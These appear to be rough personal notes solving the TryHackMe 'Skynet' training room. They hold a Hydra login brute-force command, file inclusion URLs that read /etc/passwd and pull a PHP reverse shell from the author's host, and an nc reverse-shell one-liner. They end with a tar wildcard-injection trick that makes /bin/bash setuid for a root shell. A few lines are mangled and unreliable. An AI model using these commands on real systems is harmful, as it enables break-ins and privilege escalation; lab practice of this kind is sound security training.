[https://tryhackme.com/room/skynet](https://tryhackme.com/room/skynet)
 
22 ssh  
80 http  
110 pop3 (mail)  
139 smb  
143 imap  
445 smb/tcp
 
/admin  
/ai  
/config  
/squirrelmail *  
/css  
/js
 
Smbshares:  
Anonymous  
Milesdyson
 
hydra -t 4 -l milesdyson -P log1.txt 10.10.78.55 http-post-form "/squirrelmail/src/login.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
 
User: Milesdyson
 
Smbclient //ip/share -U username
 
Smb passwd:  
)s{A&2Z=F^n_E.B`
 
Login to squirrelmail
 
Get important.txt
 
User gobuster on:  
/45kra24zxs28v3yd/
 
Gobuster dir -u ip/45kra24zxs28v3yd/ -w (2.3-medium.txt).txt
 
/administrator  
searchsploit cuppals -la /bin/basls -
 
Read exploit
 
[http://10.10.206.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd](http://10.10.206.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd)
 
Get php revshell  
Set up python server  
Set up nc listener  
Curl [http://10.10.206.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.179.48:8888/shell.php](http://10.10.206.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.179.48:8888/shell.php)
 
Shoot have user shell
 
Cat /etc/crontab
 
Cat backup.sh  
#!/bin/bash  
Cd /var/www/data  
Tar … * (has wildcard)
 
See if /bin/bash is executable  
Ls -la /bin/bash
 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <10.10.179.48> 1234 >/tmp/f" > shell.sh￼touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"￼touch "/var/www/html/--checkpoint=1"  
(( didn’t work for some reason ^ ))
 
OR
 
(( this worked: ))  
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh  
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"￼touch "/var/www/html/--checkpoint=1"
 
/bin/bash -p
 
Root shell!